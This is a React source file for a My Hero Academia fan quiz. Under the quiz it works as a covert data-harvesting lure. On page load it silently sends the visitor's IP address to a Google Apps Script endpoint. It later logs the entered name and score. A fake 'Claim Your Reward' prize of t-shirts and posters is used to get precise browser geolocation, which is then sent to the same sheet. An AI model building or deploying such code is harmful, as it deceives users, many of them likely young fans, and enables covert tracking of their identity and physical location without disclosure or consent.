import { useState, useEffect } from 'react'
import './App.css'

// Import MHA background images
import welcomeBg from './assets/my-hero-academia-world-heroes-mission-ophg4qsse6vc3peo.webp'
import quizBg from './assets/my-hero-academia-ipad-hfwu2f83yc0jqw9k.webp'
import resultBg from './assets/bakugou-aesthetic-e4mbnt4wqs52ulzo.webp'
import giftBg from './assets/deku-phone-wallpaper-uzmcoukgi0l8lk9c.webp'

// MHA Quiz Questions
const quizQuestions = [
  {
    id: 1,
    question: "What is Izuku Midoriya's hero name?",
    options: ["Deku", "All Might", "Shoto", "Ground Zero"],
    correct: 0
  },
  {
    id: 2,
    question: "Who is the Symbol of Peace?",
    options: ["Endeavor", "Hawks", "All Might", "Best Jeanist"],
    correct: 2
  },
  {
    id: 3,
    question: "What is Bakugo's Quirk called?",
    options: ["Explosion", "Half-Cold Half-Hot", "One For All", "Hardening"],
    correct: 0
  },
  {
    id: 4,
    question: "Which class is the main focus of the series?",
    options: ["Class 1-B", "Class 1-A", "Class 2-A", "Class 3-A"],
    correct: 1
  },
  {
    id: 5,
    question: "What percentage of the world's population has Quirks?",
    options: ["50%", "60%", "70%", "80%"],
    correct: 3
  },
  {
    id: 6,
    question: "Who is the homeroom teacher of Class 1-A?",
    options: ["Present Mic", "Midnight", "Aizawa", "All Might"],
    correct: 2
  },
  {
    id: 7,
    question: "What is Ochaco Uraraka's hero name?",
    options: ["Uravity", "Froppy", "Earphone Jack", "Pinky"],
    correct: 0
  },
  {
    id: 8,
    question: "What is the name of the U.A. High School's principal?",
    options: ["Principal Nezu", "Principal Mic", "Principal Aizawa", "Principal Yagi"],
    correct: 0
  },
  {
    id: 9,
    question: "What is Todoroki's father's hero name?",
    options: ["Flame Hero", "Fire Master", "Endeavor", "Inferno"],
    correct: 2
  },
  {
    id: 10,
    question: "What is the name of the League of Villains' leader?",
    options: ["All For One", "Shigaraki Tomura", "Dabi", "Toga"],
    correct: 1
  }
];

function App() {
  const [stage, setStage] = useState('welcome'); // welcome, quiz, result, gift
  const [userName, setUserName] = useState('');
  const [currentQuestion, setCurrentQuestion] = useState(0);
  const [answers, setAnswers] = useState([]);
  const [score, setScore] = useState(0);
  const [selectedOption, setSelectedOption] = useState(null);
  const [showFeedback, setShowFeedback] = useState(false);
  const [userIP, setUserIP] = useState('');
  const [location, setLocation] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const [sessionId] = useState(() => Date.now() + '-' + Math.random().toString(36).substr(2, 9));

  // Fetch IP on component mount
  useEffect(() => {
    fetchUserIP();
  }, []);

  // Save initial data when IP is fetched
  useEffect(() => {
    if (userIP && userIP !== 'Unknown') {
      // Save initial visit data immediately
      saveToGoogleSheets(sessionId, '', userIP, undefined, null, 'page_load');
    }
  }, [userIP]);

  const fetchUserIP = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      setUserIP(data.ip);
      console.log('User IP:', data.ip);
    } catch (error) {
      console.error('Error fetching IP:', error);
      setUserIP('Unknown');
    }
  };

  const saveToGoogleSheets = async (session, name, ip, quizScore, userLocation, stage) => {
    const userData = {
      sessionId: session,
      name: name || 'Not entered yet',
      ip: ip,
      timestamp: new Date().toISOString(),
      score: quizScore !== undefined ? `${quizScore}/10` : 'Not completed',
      location: userLocation ? `${userLocation.latitude}, ${userLocation.longitude}` : 'Not provided',
      stage: stage || 'unknown'
    };

    console.log(`[${stage}] Attempting to save to Sheet...`, userData);

    try {
      const response = await fetch('https://script.google.com/macros/s/AKfycbzQYjhmb-tQ1pP5cI3Ds1Z8QXn4EyIyavdMXiNaybZ0rlN41lAaPPIHKQdK4uyWn09T/exec', {
        method: 'POST',
        mode: 'no-cors', // Important for Google Sheets
        // headers: { 'Content-Type': 'application/json' }, // removing explicit header can sometimes help with CORS pre-flight, though data sending relies on the script parsing POST body correctly
        body: JSON.stringify(userData)
      });
      console.log(`[${stage}] Request sent! (Note: 'no-cors' mode opaque response)`);
    } catch (error) {
      console.error(`[${stage}] FAILED to save to Google Sheets:`, error);
      console.error('Check your internet connection or if the URL is blocked.');
    }
  };

  const startQuiz = () => {
    if (userName.trim()) {
      // Save data with name when quiz starts
      saveToGoogleSheets(sessionId, userName, userIP, undefined, null, 'quiz_started');
      setStage('quiz');
    } else {
      alert('Please enter your name to continue!');
    }
  };

  const handleAnswerSelect = (optionIndex) => {
    if (!showFeedback) {
      setSelectedOption(optionIndex);
      setShowFeedback(true);

      const isCorrect = optionIndex === quizQuestions[currentQuestion].correct;
      if (isCorrect) {
        setScore(score + 1);
      }

      setAnswers([...answers, { question: currentQuestion, answer: optionIndex, correct: isCorrect }]);

      setTimeout(() => {
        if (currentQuestion < quizQuestions.length - 1) {
          setCurrentQuestion(currentQuestion + 1);
          setSelectedOption(null);
          setShowFeedback(false);
        } else {
          setStage('result');
        }
      }, 1500);
    }
  };

  const requestLocation = () => {
    // Save score immediately when quiz is completed
    saveToGoogleSheets(sessionId, userName, userIP, score, null, 'quiz_completed');

    setIsLoading(true);
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const loc = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          };
          setLocation(loc);
          setIsLoading(false);
          setStage('gift');
          // Save to Google Sheets with all data including location
          saveToGoogleSheets(sessionId, userName, userIP, score, loc, 'location_granted');
        },
        (error) => {
          console.error('Error getting location:', error);
          setIsLoading(false);
          alert('Location access denied. You can still claim your gift!');
          setStage('gift');
          // Save to Google Sheets without location
          saveToGoogleSheets(sessionId, userName, userIP, score, null, 'location_denied');
        }
      );
    } else {
      alert('Geolocation is not supported by your browser.');
      setIsLoading(false);
      setStage('gift');
      // Save to Google Sheets without location
      saveToGoogleSheets(sessionId, userName, userIP, score, null, 'geolocation_unsupported');
    }
  };

  const renderWelcome = () => (
    <div className="welcome-screen animate-fade-in" style={{ backgroundImage: `url(${welcomeBg})` }}>
      <div className="hero-logo">
        <div className="logo-circle">
          <span className="plus-ultra">PLUS ULTRA!</span>
        </div>
      </div>
      <h1 className="main-title">My Hero Academia</h1>
      <h2 className="subtitle">Ultimate Hero Quiz</h2>
      <p className="description">Test your knowledge about the world of heroes and villains!</p>

      <div className="input-container">
        <input
          type="text"
          placeholder="Enter Your Hero Name..."
          value={userName}
          onChange={(e) => setUserName(e.target.value)}
          onKeyPress={(e) => e.key === 'Enter' && startQuiz()}
          className="name-input"
        />
        <button onClick={startQuiz} className="start-btn">
          <span>Start Quiz</span>
          <div className="btn-shine"></div>
        </button>
      </div>
    </div>
  );

  const renderQuiz = () => {
    const question = quizQuestions[currentQuestion];
    const progress = ((currentQuestion + 1) / quizQuestions.length) * 100;

    return (
      <div className="quiz-screen animate-slide-in" style={{ backgroundImage: `url(${quizBg})` }}>
        <div className="quiz-header">
          <div className="progress-bar">
            <div className="progress-fill" style={{ width: `${progress}%` }}></div>
          </div>
          <div className="quiz-info">
            <span className="question-counter">Question {currentQuestion + 1}/{quizQuestions.length}</span>
            <span className="score-counter">Score: {score}</span>
          </div>
        </div>

        <div className="question-card">
          <h3 className="question-text">{question.question}</h3>

          <div className="options-container">
            {question.options.map((option, index) => {
              let optionClass = 'option';
              if (showFeedback) {
                if (index === question.correct) {
                  optionClass += ' correct';
                } else if (index === selectedOption && index !== question.correct) {
                  optionClass += ' incorrect';
                }
              } else if (selectedOption === index) {
                optionClass += ' selected';
              }

              return (
                <button
                  key={index}
                  className={optionClass}
                  onClick={() => handleAnswerSelect(index)}
                  disabled={showFeedback}
                >
                  <span className="option-letter">{String.fromCharCode(65 + index)}</span>
                  <span className="option-text">{option}</span>
                  {showFeedback && index === question.correct && <span className="check-mark">✓</span>}
                  {showFeedback && index === selectedOption && index !== question.correct && <span className="cross-mark">✗</span>}
                </button>
              );
            })}
          </div>
        </div>
      </div>
    );
  };

  const renderResult = () => {
    const percentage = (score / quizQuestions.length) * 100;
    let message = '';
    let rank = '';

    if (percentage >= 90) {
      rank = 'Symbol of Peace';
      message = 'Outstanding! You\'re a true MHA expert!';
    } else if (percentage >= 70) {
      rank = 'Pro Hero';
      message = 'Great job! You know your heroes well!';
    } else if (percentage >= 50) {
      rank = 'Hero in Training';
      message = 'Good effort! Keep studying at U.A.!';
    } else {
      rank = 'Aspiring Hero';
      message = 'Don\'t give up! Every hero starts somewhere!';
    }

    return (
      <div className="result-screen animate-fade-in" style={{ backgroundImage: `url(${resultBg})` }}>
        <div className="result-card">
          <h2 className="result-title">Quiz Complete, {userName}!</h2>
          <div className="score-display">
            <div className="score-circle">
              <svg viewBox="0 0 200 200">
                <circle cx="100" cy="100" r="90" className="score-bg" />
                <circle
                  cx="100"
                  cy="100"
                  r="90"
                  className="score-progress"
                  style={{
                    strokeDasharray: `${2 * Math.PI * 90}`,
                    strokeDashoffset: `${2 * Math.PI * 90 * (1 - percentage / 100)}`
                  }}
                />
              </svg>
              <div className="score-text">
                <span className="score-number">{score}/{quizQuestions.length}</span>
                <span className="score-percentage">{percentage.toFixed(0)}%</span>
              </div>
            </div>
          </div>

          <div className="rank-display">
            <h3 className="rank-title">Your Rank</h3>
            <p className="rank-name">{rank}</p>
            <p className="rank-message">{message}</p>
          </div>

          <button onClick={requestLocation} className="claim-btn" disabled={isLoading}>
            {isLoading ? 'Getting Location...' : 'Claim Your Reward! 🎁'}
          </button>
        </div>
      </div>
    );
  };

  const renderGift = () => (
    <div className="gift-screen animate-fade-in" style={{ backgroundImage: `url(${giftBg})` }}>
      <div className="gift-card">
        <div className="gift-icon">🎁</div>
        <h2 className="gift-title">Congratulations, {userName}!</h2>
        <p className="gift-subtitle">Thank you for completing the quiz!</p>

        <div className="gift-items">
          <h3>Your MHA Goodies:</h3>
          <ul className="goodies-list">
            <li>🎭 Exclusive MHA Hero Poster</li>
            <li>👕 Limited Edition T-Shirt</li>
            <li>📱 MHA Phone Wallpaper Pack</li>
            <li>🎨 Digital Art Collection</li>
            <li>🏅 Hero Certificate with your name!</li>
          </ul>
        </div>

        <div className="final-message">
          <p className="plus-ultra-final">PLUS ULTRA! 💪</p>
          <p>Keep being awesome, hero!</p>
        </div>

        <button onClick={() => window.location.reload()} className="restart-btn">
          Take Quiz Again
        </button>
      </div>
    </div>
  );

  return (
    <div className="app">
      <div className="background-animation">
        <div className="hero-symbol hero-symbol-1"></div>
        <div className="hero-symbol hero-symbol-2"></div>
        <div className="hero-symbol hero-symbol-3"></div>
      </div>

      <div className="container">
        {stage === 'welcome' && renderWelcome()}
        {stage === 'quiz' && renderQuiz()}
        {stage === 'result' && renderResult()}
        {stage === 'gift' && renderGift()}
      </div>
    </div>
  );
}

export default App;
